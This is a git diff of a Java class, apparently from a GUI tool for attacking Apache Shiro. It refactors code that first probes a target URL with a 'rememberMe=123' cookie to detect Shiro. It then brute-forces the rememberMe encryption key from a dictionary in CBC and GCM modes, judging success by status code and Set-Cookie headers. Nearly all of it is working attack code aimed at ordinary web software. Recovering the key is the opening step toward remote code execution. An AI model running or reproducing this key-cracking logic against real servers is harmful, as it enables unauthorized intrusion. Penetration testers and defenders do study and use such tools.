@@ -81,13 +81,50 @@ public class BruteKey {
         boolean tryCBC = "爆破所有".equals(cryptType) || "CBC".equals(cryptType);
         boolean tryGCM = "爆破所有".equals(cryptType) || "GCM".equals(cryptType);
 
-        boolean checkFlag = false;
-
         // 获取请求方式（从 UI 获取，默认 GET）
         String requestType = globalComponents.requestTypeComboBox != null ? globalComponents.requestTypeComboBox.getValue() : "GET";
         // 获取 Content-Type 和请求体
         String contentType = globalComponents.contentTypeField != null ? globalComponents.contentTypeField.getValue() : null;
         String requestBody = globalComponents.requestBodyField != null ? globalComponents.requestBodyField.getText().trim() : null;
+
+        // 【优化】在循环前先发送一次 rememberMe=123 请求，检测是否存在 Shiro 框架
+        // 创建请求体（根据用户配置）
+        RequestBody httpRequestBody = createRequestBody(contentType, requestBody);
+
+        Map<String, String> headers_123 = new HashMap<>();
+        headers_123.put("Cookie", rememberMeString + "=" + "123");
+        ResponseOBJ response_123 = HttpRequest.httpRequest(url, httpRequestBody, headers_123, requestType);
+
+        // 先判断是否存在shiro框架
+        // 检查所有 Set-Cookie 头中是否包含 rememberMe 关键字
+        boolean hasRememberMe = false;
+        for (String setCookie : response_123.getHeaders().values("Set-Cookie")) {
+            if (setCookie.contains(rememberMeString)) {
+                hasRememberMe = true;
+                break;
+            }
+        }
+
+        if (!hasRememberMe) {
+            System.out.println(Log.buffer_logging("INFO", "不存在shiro框架"));
+            if (globalComponents.logArea != null) {
+                Platform.runLater(() -> {
+                    appendLogWithScroll(globalComponents.logArea, "[INFO]不存在shiro框架\n");
+                });
+            }
+            return keyInfoObj;
+        }
+
+        // 存在shiro框架，继续爆破
+        System.out.println(Log.buffer_logging("INFO", "存在shiro框架"));
+        if (globalComponents.logArea != null) {
+            Platform.runLater(() -> {
+                appendLogWithScroll(globalComponents.logArea, "[INFO]存在shiro框架\n");
+            });
+        }
+
+        // 获取基准响应头数量（用于后续对比）
+        int length_123 = response_123.getHeaders().size();
 
         // 遍历key字典进行爆破
         for (String s : keys) {
@@ -122,14 +159,7 @@ public class BruteKey {
                 payload_gcm = rememberMeString + "=" + Tools.GCM_Encrypt(s, checkData);
             }
 
-            // 构造请求进行对比
-            // 创建请求体（根据用户配置）
-            RequestBody httpRequestBody = createRequestBody(contentType, requestBody);
-
-            Map<String, String> headers_123 = new HashMap<>();
-            headers_123.put("Cookie", rememberMeString + "=" + "123");
-            ResponseOBJ response_123 = HttpRequest.httpRequest(url, httpRequestBody, headers_123, requestType);
-
+            // 构造 CBC 和 GCM 请求（不需要重复发送 rememberMe=123）
             Map<String, String> headers_cbc = null;
             ResponseOBJ response_cbc = null;
 
@@ -148,34 +178,6 @@ public class BruteKey {
                 response_gcm = HttpRequest.httpRequest(url, httpRequestBody, headers_gcm, requestType);
             }
 
-            // 先判断是否存在shiro框架
-            // 检查所有 Set-Cookie 头中是否包含 rememberMe 关键字
-            boolean hasRememberMe = false;
-            for (String setCookie : response_123.getHeaders().values("Set-Cookie")) {
-                if (setCookie.contains(rememberMeString)) {
-                    hasRememberMe = true;
-                    break;
-                }
-            }
-
-            if (hasRememberMe && !checkFlag) {
-                System.out.println(Log.buffer_logging("INFO", "存在shiro框架"));
-                if (globalComponents.logArea!= null) {
-                    Platform.runLater(() -> {
-                        appendLogWithScroll(globalComponents.logArea, "[INFO]存在shiro框架\n");
-                    });
-                    checkFlag = true;
-                }
-            } else if (!hasRememberMe && !checkFlag){
-                System.out.println(Log.buffer_logging("INFO", "不存在shiro框架"));
-                if (globalComponents.logArea!= null) {
-                    Platform.runLater(() -> {
-                        appendLogWithScroll(globalComponents.logArea, "[INFO]不存在shiro框架\n");
-                    });
-                }
-                return keyInfoObj;
-            }
-
             // 控制台打印
             System.out.println(Log.buffer_logging("INFO", "正在尝试key: " + s));
             // UI打印
@@ -187,30 +189,32 @@ public class BruteKey {
 
             // 判断响应
             // shiro在密钥错误时会返回400状态码，并且响应体中会包含deleteMe特征
-            if (response_cbc != null || response_gcm != null) {
-                int length_123 = response_123.getHeaders().size();
+            boolean cbcSuccess = false;
+            boolean gcmSuccess = false;
 
-                // 检查 CBC 模式
-                if (tryCBC && response_cbc != null) {
-                    int length_cbc = response_cbc.getHeaders().size();
-                    if (length_cbc != length_123 && response_cbc.getStatusCode() != 400 && response_cbc.getHeaders().get("Set-Cookie") == null) {
-                        key = s;
-                        keyInfoObj.setKey(key);
-                        keyInfoObj.setType("CBC");
-                        break;
-                    }
+            // 检查 CBC 模式
+            if (tryCBC && response_cbc != null) {
+                int length_cbc = response_cbc.getHeaders().size();
+                if (length_cbc != length_123 && response_cbc.getStatusCode() != 400 && response_cbc.getHeaders().get("Set-Cookie") == null) {
+                    cbcSuccess = true;
                 }
+            }
 
-                // 检查 GCM 模式
-                if (tryGCM && response_gcm != null) {
-                    int length_gcm = response_gcm.getHeaders().size();
-                    if (length_gcm != length_123 && response_gcm.getStatusCode() != 400 && response_gcm.getHeaders().get("Set-Cookie") == null) {
-                        key = s;
-                        keyInfoObj.setKey(key);
-                        keyInfoObj.setType("GCM");
-                        break;
-                    }
+            // 检查 GCM 模式
+            if (tryGCM && response_gcm != null) {
+                int length_gcm = response_gcm.getHeaders().size();
+                if (length_gcm != length_123 && response_gcm.getStatusCode() != 400 && response_gcm.getHeaders().get("Set-Cookie") == null) {
+                    gcmSuccess = true;
                 }
+            }
+
+            // 如果任意一种模式成功，保存密钥并退出
+            if (cbcSuccess || gcmSuccess) {
+                key = s;
+                keyInfoObj.setKey(key);
+                // CBC 优先，如果 CBC 成功就用 CBC，否则用 GCM
+                keyInfoObj.setType(cbcSuccess ? "CBC" : "GCM");
+                break;
             }
         }
 
